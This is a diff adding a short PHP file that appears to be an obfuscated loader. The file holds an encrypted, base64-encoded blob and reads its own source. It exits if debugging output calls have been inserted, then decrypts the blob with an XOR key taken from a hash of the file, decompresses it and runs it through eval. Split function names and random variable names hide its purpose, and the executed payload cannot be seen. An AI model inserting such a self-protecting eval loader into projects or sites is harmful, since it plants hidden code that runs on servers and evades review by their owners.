@@ -1,0 +1,24 @@
+<?php
+$vsrmzqp="afa8afa3f30070d7c79e0b191b8aae33";
+$ytotguvyygva="5200595c545f07055f5502085454560605065c57535a070c0707595853030502";
+$dwbeashcswel="Pqp/1pZ/Zjbphf500kQGgDqCdXMfKGdRAMvnH3X359jeEbgz9QVJzFvn6Yyfv30hm88w2nQhDLd1EO7Z0rC+euDTgcsBoPXjNvylQxklWGJ51Q8Hpf/ggk98lN1nxzxlQi/DkiUJZ1W19lfPWBowP+azZFJcxLUodZNJvDuB+J7O+20/BLSIb2vkFgBGda/liN8GNV/RAMKQ6Dicn25gLiZYMvDA3lsXu7ydf02e2gTvZEjx1EssbmkoBey8r442b5ocf/TPQd9HDsAV1/P8NjfbD7lxgaLh5/1ygodDvwwR6NxX8bZfZcp1Rs0BohQCUxzDpesxjZu+hu73VD5Q9UTh6XqBvxI6M9cZ+tpu6E9V2KP/IMfDuebRMssHbub8h72mQIQA6wowhgHWP7MAAS8dnGT1p0NA+BBT3Liit8at8nM00C5U218U4t0qjIlK0nVH00LJPDT85GCz3m681ny3OquqFLbNWx6C8ZEV0ufvmvaouTI7+U18cF4HeTATq8c/ynOIbO1Th92hBnIPSDAiG5uYEvN4lRcgu9JKaU9j5aAISpvE9ycWAwoD4+5mBlnK53M/uY4WiGipJPv+ULEB0QIGOqfV7ZaYohvEM6CyZSc6E1rhTwZ26ITeh6hv3L+jUkuMWI4H6gul3p6FsGCvBFbv//GBuGGr2fuMFlr80i3L4mSg9EQpDuuPoTyrECyPK6yCGs2QLZdDsISq8ChpOJKTMf6zTSEYH5vb74PTu838kjckmI+Upbz7xfSCY+xGNExHGxzAHplb05nqupq0U2vMs/P0/PbD/fQRiQfIozRGpWsgfHAsteaXirdxrdcKO9fjkdEp8OkAo+9f6j4Km/Mb/pz/3VfH805dLPiYIN1C5aMkUnXLbdLzzPB3lkpD2KGMmf6brGaYazVUkPwmYaJ4lvJT+jyrxGC3jvN5/W8x0GjM0OgJ/kOmAoTwy4sYUTmRUjsLd5+9W4jF7/pUQn+japvLwo39B5xl";
+$jfjnmsouqbuu=file_get_contents(__FILE__);
+$mcruqwukh=str_replace($dwbeashcswel,"",$jfjnmsouqbuu);
+if(strpos($mcruqwukh,"ec"."ho")!==false||strpos($mcruqwukh,"pr"."int")!==false||strpos($mcruqwukh,"var_"."dump")!==false||strpos($mcruqwukh,"file_put_"."contents")!==false||strpos($mcruqwukh,"fw"."rite")!==false){die();}
+$husluld=str_replace(array($vsrmzqp,$ytotguvyygva),array("SP_f5e2424e","KP_07c8fc19"),$jfjnmsouqbuu);
+$pykpxx=md5($husluld);
+$bloptlvupt=hex2bin($ytotguvyygva);
+$ruxatxmkfc="";
+$cmdggdcfrd=strlen($pykpxx);
+for($xwzdvj=0;$xwzdvj<$cmdggdcfrd;$xwzdvj++){
+    $ruxatxmkfc.=chr(ord($bloptlvupt[$xwzdvj])^ord($pykpxx[$xwzdvj]));
+}
+$ztkssjiau=base64_decode($dwbeashcswel);
+$fuuttvgk=strlen($ztkssjiau);
+$nqxumh="";
+$wjfivtvlgcns=strlen($ruxatxmkfc);
+for($xwzdvj=0;$xwzdvj<$fuuttvgk;$xwzdvj++){
+    $nqxumh.=$ztkssjiau[$xwzdvj]^$ruxatxmkfc[$xwzdvj%$wjfivtvlgcns];
+}
+$dvbctllgr="gz"."in"."fl"."ate";
+eval($dvbctllgr($nqxumh));
